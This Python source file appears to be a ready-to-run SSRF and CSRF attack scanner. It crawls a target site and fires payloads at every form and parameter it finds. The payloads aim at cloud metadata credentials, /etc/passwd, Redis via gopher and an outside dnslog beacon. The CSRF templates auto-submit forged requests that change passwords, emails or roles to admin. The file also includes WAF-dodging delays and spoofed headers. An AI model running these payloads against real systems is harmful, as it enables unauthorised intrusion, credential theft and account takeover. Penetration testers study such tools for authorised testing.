#!/usr/bin/env python3
# ╔══════════════════════════════════════════════════════════════════════════╗
# ║ CSRF | XSRF | SSRF Red‑Team Scanner v3.0                                 ║
# ║ Author : Haroon Ahmad Awan · CyberZeus  (haroon@cyberzeus.pk)            ║
# ║ Licence: MIT  (For *authorised* security testing & research only)        ║
# ╚══════════════════════════════════════════════════════════════════════════╝
# ────────────────────────────────────────────────────────────────────────────
#  1) Imports & basic setup
# ────────────────────────────────────────────────────────────────────────────
import os, re, sys, ssl, time, random, string, logging, warnings, argparse
import urllib.parse
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor
import requests, bs4                                   # HTML parsing
from fake_useragent import UserAgent                   # Fresh User‑Agents
from playwright.sync_api import sync_playwright        # Headless browser

warnings.filterwarnings("ignore")
ssl._create_default_https_context = ssl._create_unverified_context

# ────────────────────────────────────────────────────────────────────────────
#  2) Global constants
# ────────────────────────────────────────────────────────────────────────────
VERSION          = "3.0"
DNSLOG_SUB       = f"ssrf{random.randint(1000,9999)}"
DNSLOG_DOMAIN    = "1mslqu.dnslog.cn"           # out‑of‑band SSRF beacon
LOGFILE          = Path("bandesbahan_findings.md")
TIMEOUT_REQ      = 8                                   # seconds for HTTP req
HEADLESS_WAIT    = 2500                                # ms wait after render
DEFAULT_THREADS  = 14
MAX_PAGES        = 180

MS_TAGS = {                                            # STRIDE‑aligned labels
    "CSRF": ["Tampering", "Repudiation"],
    "SSRF": ["Information Disclosure", "Elevation of Privilege"]
}

logging.basicConfig(level=logging.INFO, format="%(message)s")
UA = UserAgent()                                       # random UA generator

# ────────────────────────────────────────────────────────────────────────────
#  3) CLI flags
# ────────────────────────────────────────────────────────────────────────────
cli = argparse.ArgumentParser(
    description="bandesbahan Ω‑Edition – Unified CSRF / XSRF / SSRF Scanner")
cli.add_argument("-u","--url", required=True,
                 help="Target root (e.g. https://vuln.lab)")
cli.add_argument("--threads", type=int, default=DEFAULT_THREADS,
                 help="Worker threads (default 14)")
cli.add_argument("--max-pages", type=int, default=MAX_PAGES,
                 help="Crawler cap (default 180)")
cli.add_argument("--stealth", action="store_true", default=True,
                 help="Enable adaptive WAF delays (default on)")
cli.add_argument("--no-stealth", action="store_false", dest="stealth",
                 help="Disable delays, run flat‑out")
cli.add_argument("--debug", action="store_true")
ARGS   = cli.parse_args()
DEBUG  = ARGS.debug
if DEBUG: logging.getLogger().setLevel(logging.DEBUG)

# ────────────────────────────────────────────────────────────────────────────
#  4) Payload banks
# ────────────────────────────────────────────────────────────────────────────
SSRF_PAYLOADS = [
    # Internal / cloud
    "http://127.0.0.1", "http://localhost", "http://[::1]",
    "http://169.254.169.254/latest/meta-data/",          # AWS creds
    "http://10.0.0.1", "http://192.168.1.1",
    "http://internal-service.default.svc.cluster.local", # k8s
    # DNS beacon – check dnslog.cn panel
    f"http://{DNSLOG_DOMAIN}",
    # Protocol smuggling
    "gopher://127.0.0.1:6379/_PING",
    "file:///etc/passwd"
]

CSRF_TEMPLATES = [
    # Classic POST form
    """<form action="{t}" method="POST"><input name=change_email value=h@cked>
    </form><script>document.forms[0].submit()</script>""",
    # Iframe auto‑submit
    """<iframe srcdoc='<form action="{t}" method="POST">
       <input name=password value=newpass123></form>
       <script>document.forms[0].submit()</script>'></iframe>""",
    # GET CSRF
    """<img src="{t}?reset=true">""",
    # fetch() JSON CSRF
    """<script>fetch("{t}",{method:"POST",credentials:"include",
      headers:{{"Content-Type":"application/x-www-form-urlencoded"}},
      body:"role=admin"})</script>""",
    # Content‑Type: text/plain token bypass
    """<form action="{t}" method="POST" enctype="text/plain">
       <input name=admin value=1></form>
       <script>document.forms[0].submit()</script>"""
]

# ────────────────────────────────────────────────────────────────────────────
#  5) Helper functions
# ────────────────────────────────────────────────────────────────────────────
def hdrs():
    """Return randomised headers for each request."""
    return {
        "User-Agent": UA.random,
        "Referer": random.choice(["https://google.com","https://bing.com"]),
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
    }

def adaptive_sleep(status:int|None)->None:
    """AI‑style back‑off to dodge WAF / rate limits."""
    if not ARGS.stealth: return
    rng = (0.8,2.5)
    if status in {403,429,503}: rng = (10,20)
    elif status in {301,302}:   rng = (3,6)
    time.sleep(random.uniform(*rng))

def smart_url(b:str)->str:
    """Force HTTPS first; fall back to HTTP."""
    if b.startswith("http"): return b
    for s in ("https://","http://"):
        try:
            if requests.head(s+b,timeout=4).ok: return s+b
        except: pass
    return "http://"+b

def md_log(kind:str, url:str, payload:str,
           status:str, reason:str, conf:float)->None:
    """Write one finding line into the Markdown report."""
    tags = ", ".join(MS_TAGS.get(kind, []))
    entry = (f"- **{kind}** `{url}`\n"
             f"  - Status : {status}  (confidence {conf:.2f})\n"
             f"  - Reason : {reason}\n"
             f"  - Payload: `{payload[:80]}`\n"
             f"  - Tags   : {tags}\n")
    LOGFILE.parent.mkdir(exist_ok=True)
    with open(LOGFILE,"a",encoding="utf-8") as f: f.write(entry)
    logging.info(entry.strip().replace("\n  ","  "))

# ────────────────────────────────────────────────────────────────────────────
#  6) Crawler – links, forms, JS endpoints
# ────────────────────────────────────────────────────────────────────────────
_JS_URL = re.compile(
    r'(?:fetch\(|axios\.(?:get|post)\(|XMLHttpRequest\(.+?open\()'
    r'\s*["\']([^"\']+)["\']', re.I)

def crawl(root:str, cap:int):
    seen, queue, targets = set(), [root], []
    domain = urllib.parse.urlparse(root).netloc
    while queue and len(seen) < cap:
        url = queue.pop(0)
        seen.add(url)
        try:
            r = requests.get(url, headers=hdrs(), timeout=TIMEOUT_REQ)
            adaptive_sleep(r.status_code)
            if "text/html" not in r.headers.get("Content-Type",""): continue
        except: continue

        soup = bs4.BeautifulSoup(r.text,"html.parser")

        #  a) <a href>
        for a in soup.find_all("a",href=True):
            full = urllib.parse.urljoin(url,a["href"])
            if urllib.parse.urlparse(full).netloc == domain and full not in seen:
                queue.append(full)
            if "?" in full:
                p = urllib.parse.urlparse(full)
                qs= list(urllib.parse.parse_qs(p.query))
                if qs: targets.append({"url":p._replace(query="").geturl(),
                                       "method":"GET","params":qs})

        #  b) <form>
        for f in soup.find_all("form"):
            act=urllib.parse.urljoin(url,f.get("action") or url)
            if urllib.parse.urlparse(act).netloc != domain: continue
            names=[i.get("name") for i in f.find_all("input",{"name":True})]
            if names:
                targets.append({"url":act,"method":f.get("method","GET").upper(),
                                "params":names})

        #  c) JS‑defined endpoints
        for u in _JS_URL.findall(r.text):
            full=urllib.parse.urljoin(url,u)
            if urllib.parse.urlparse(full).netloc==domain and "?" in full:
                p=urllib.parse.urlparse(full); qs=list(urllib.parse.parse_qs(p.query))
                if qs: targets.append({"url":p._replace(query="").geturl(),
                                       "method":"GET","params":qs})
    return targets

# ────────────────────────────────────────────────────────────────────────────
#  7) CSRF verifier (headless Firefox)
# ────────────────────────────────────────────────────────────────────────────
def verify_csrf(html:str)->bool:
    try:
        with sync_playwright() as p:
            b=p.firefox.launch(headless=True,args=["--no-sandbox"])
            ctx=b.new_context(); pg=ctx.new_page()
            pg.set_content(html,wait_until="domcontentloaded")
            pg.wait_for_timeout(HEADLESS_WAIT)
            ok="captcha" not in pg.content().lower()
            ctx.close(); b.close(); return ok
    except: return False

# ────────────────────────────────────────────────────────────────────────────
#  8) The actual scanner
# ────────────────────────────────────────────────────────────────────────────
def scan(target):
    url,method,params = target["url"],target["method"],target["params"]

    # A) SSRF fuzz
    for pl in SSRF_PAYLOADS:
        data={p:pl for p in params}
        try:
            r=(requests.get if method=="GET" else requests.post)(
                url, params=data if method=="GET" else None,
                data=data   if method=="POST" else None,
                headers=hdrs(), timeout=TIMEOUT_REQ)
            adaptive_sleep(r.status_code)
            body=r.text.lower()
        except:
            adaptive_sleep(None)
            continue

        # evidence scoring
        if "root:x" in body:
            md_log("SSRF",url,pl,"Confirmed","/etc/passwd snippet",0.95); return
        if "localhost" in body:
            md_log("SSRF",url,pl,"Confirmed","string 'localhost' reflected",0.80);return
        if DNSLOG_DOMAIN in pl:
            md_log("SSRF",url,pl,"Suspected","Blind beacon – check dnslog.cn",0.50)

    # B) CSRF / XSRF fuzz (POST only)
    if method=="POST":
        for tpl in CSRF_TEMPLATES:
            html=tpl.format(t=url)
            if verify_csrf(html):
                reason="Form auto‑submitted – verify server‑side effect"
                md_log("CSRF",url,html.strip(),"Suspected",reason,0.60);return

# ────────────────────────────────────────────────────────────────────────────
#  9) Main routine
# ────────────────────────────────────────────────────────────────────────────
def main():
    root=smart_url(ARGS.url.rstrip("/"))
    if not LOGFILE.exists():
        LOGFILE.write_text(f"# bandesbahan Findings v{VERSION}\n\n","utf-8")
    logging.info(f"🔥 bandesbahan Ω‑Edition {VERSION}")
    logging.info(f"[»] Crawl start → {root}")
    targets=crawl(root,ARGS.max_pages)
    logging.info(f"[+] Identified {len(targets)} fuzzable endpoints\n")

    with ThreadPoolExecutor(max_workers=ARGS.threads) as pool:
        pool.map(scan,targets)

    logging.info(f"[✓] Done – report → {LOGFILE.resolve()}")
    logging.info(f"[i] Blind‑SSRF beacons used dnslog host → {DNSLOG_DOMAIN}")

if __name__=="__main__":
    main()
